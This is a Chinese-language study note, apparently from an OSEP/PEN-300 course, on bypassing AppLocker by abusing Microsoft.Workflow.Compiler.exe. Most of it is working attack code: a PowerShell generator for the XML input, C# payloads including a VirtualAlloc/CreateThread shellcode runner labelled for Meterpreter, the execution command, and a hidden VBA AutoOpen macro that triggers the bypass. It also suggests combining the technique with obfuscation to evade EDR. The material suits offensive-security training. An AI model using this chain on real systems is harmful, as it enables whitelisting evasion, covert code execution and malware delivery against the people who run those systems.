---
title: OSEP-09-Workflow-Compiler绕过详解
description: '09-应用白名单绕过 | 05-Workflow-Compiler绕过详解'
pubDate: 2026-01-30T00:01:32+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# Microsoft.Workflow.Compiler绕过AppLocker - 高级技术

## 概述

本文介绍如何通过逆向工程发现并利用Microsoft.Workflow.Compiler.exe来绕过AppLocker,执行任意C#代码。

---

## 第一部分:发现目标

### 1.1 寻找可利用的程序集

我们需要找到一个:
- 位于白名单目录的程序集
- 由Microsoft签名
- 能够加载并执行任意代码

**目标:** `System.Workflow.ComponentModel.dll`

位置: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319`

### 1.2 使用dnSpy逆向分析

打开dnSpy,加载目标DLL,分析`System.Workflow.ComponentModel.Compiler`命名空间。

---

## 第二部分:代码路径分析

### 2.1 关键代码路径

```
WorkflowCompiler.Compile()
    ↓
WorkflowCompilerInternal.Compile()
    ↓
GenerateLocalAssembly()
    ↓
CompileAssemblyFromFile()
    ↓
Assembly.Load()  ← 加载编译后的程序集
    ↓
InternalCompileFromDomBatch()
    ↓
Activator.CreateInstance()  ← 执行代码!
```

### 2.2 Assembly.Load调用

```csharp
// 在GenerateLocalAssembly中
if (!FileIntegrity.IsEnabled)
{
    compilerResults.CompiledAssembly = Assembly.Load(array, null, options.Evidence);
    return compilerResults;
}
```

**关键:** 只有当WDAC未启用时才会执行此路径(AppLocker不影响)

### 2.3 代码执行触发

```csharp
// 在InternalCompileFromDomBatch中
foreach (Type type in typeProvider.LocalAssembly.GetTypes())
{
    if (TypeProvider.IsAssignable(typeof(Activity), type) && !type.IsAbstract)
    {
        // 实例化对象,执行构造函数
        activity = (Activator.CreateInstance(type) as Activity);
    }
}
```

**要求:** 我们的代码必须包含一个继承自`Activity`的非抽象类

---

## 第三部分:调用入口点

### 3.1 Microsoft.Workflow.Compiler.exe

```csharp
// Main方法
private static void Main(string[] args)
{
    if (args == null || args.Length != 2)
    {
        throw new ArgumentException(...);
    }
    CompilerInput compilerInput = Program.ReadCompilerInput(args[0]);
    WorkflowCompilerResults results = new WorkflowCompiler().Compile(
        compilerInput.Parameters, compilerInput.Files);
    Program.WriteCompilerOutput(args[1], results);
}
```

**参数:**
- args[0]: XML配置文件路径
- args[1]: 输出文件路径

### 3.2 XML文件格式

```csharp
// ReadCompilerInput方法
private static CompilerInput ReadCompilerInput(string path)
{
    using (Stream stream = new FileStream(path, FileMode.Open, ...))
    {
        XmlReader reader = XmlReader.Create(stream);
        result = (CompilerInput)new DataContractSerializer(typeof(CompilerInput))
            .ReadObject(reader);
    }
    return result;
}
```

---

## 第四部分:生成有效的XML文件

### 4.1 使用PowerShell生成

```powershell
# 加载程序集
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)

# 通过反射获取私有方法
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod(
    'SerializeInputToWrapper',
    [Reflection.BindingFlags] 'NonPublic, Static'
)

# 创建编译器参数
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters

# 设置关键参数
$compilerparam.GenerateInMemory = $True

# 指定C#代码文件路径
$pathvar = "C:\Tools\payload.cs"
$output = "C:\Tools\test.xml"

# 调用序列化方法
$tmp = $SerializeInputToWrapper.Invoke($null, @(
    [Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam,
    [String[]] @(,$pathvar)
))
Move-Item $tmp $output
```

### 4.2 生成的XML示例

```xml
<?xml version="1.0" encoding="utf-8"?>
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
               xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
  <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <d2p1:string>C:\Tools\payload.cs</d2p1:string>
  </files>
  <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
    <d2p1:generateInMemory>true</d2p1:generateInMemory>
    <!-- 其他参数 -->
  </parameters>
</CompilerInput>
```

---

## 第五部分:创建Payload

### 5.1 Payload要求

- 必须包含继承自`System.Workflow.ComponentModel.Activity`的类
- 类不能是抽象的
- 恶意代码放在构造函数中

### 5.2 Payload示例

```csharp
using System;
using System.Workflow.ComponentModel;

public class Run : Activity
{
    public Run()
    {
        // 在这里放置恶意代码
        Console.WriteLine("Code executed!");

        // 例如:启动进程
        System.Diagnostics.Process.Start("calc.exe");
    }
}
```

### 5.3 带Shellcode的Payload

```csharp
using System;
using System.Workflow.ComponentModel;
using System.Runtime.InteropServices;

public class Run : Activity
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public Run()
    {
        // Meterpreter shellcode
        byte[] buf = new byte[] { 0xfc, 0x48, 0x83 };  // 实际使用时替换为完整 shellcode

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

---

## 第六部分:执行绕过

### 6.1 执行命令

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe test.xml output.txt
```

### 6.2 完整攻击流程

1. 创建C# payload文件(payload.cs)
2. 使用PowerShell生成XML配置文件
3. 执行Microsoft.Workflow.Compiler.exe
4. 代码被编译、加载并执行

### 6.3 从VBA宏调用

```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe " & _
          "C:\Users\Public\test.xml C:\Users\Public\output.txt"
    Shell cmd, vbHide
End Sub
```

---

## 第七部分:简化的XML文件

### 7.1 手动创建XML

可以手动创建简化的XML文件:

```xml
<?xml version="1.0" encoding="utf-8"?>
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
               xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
  <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <d2p1:string>C:\Users\Public\payload.cs</d2p1:string>
  </files>
  <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
    <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays"
                   xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <d2p1:generateInMemory>true</d2p1:generateInMemory>
  </parameters>
</CompilerInput>
```

---

## 常见问题

### Q1: 为什么选择这个程序集?

- 位于白名单目录
- 由Microsoft签名
- 包含编译和加载代码的功能

### Q2: 如果Microsoft.Workflow.Compiler被阻止怎么办?

可以寻找其他调用相同功能的程序,或使用其他LOLBAS技术。

### Q3: 这个技术会被检测吗?

- EDR可能监控Microsoft.Workflow.Compiler的执行
- 可以结合其他混淆技术

---

## 练习

1. 使用dnSpy分析System.Workflow.ComponentModel.dll
2. 跟踪代码路径到Assembly.Load
3. 使用PowerShell生成有效的XML文件
4. 创建继承Activity的payload
5. 执行完整的绕过攻击
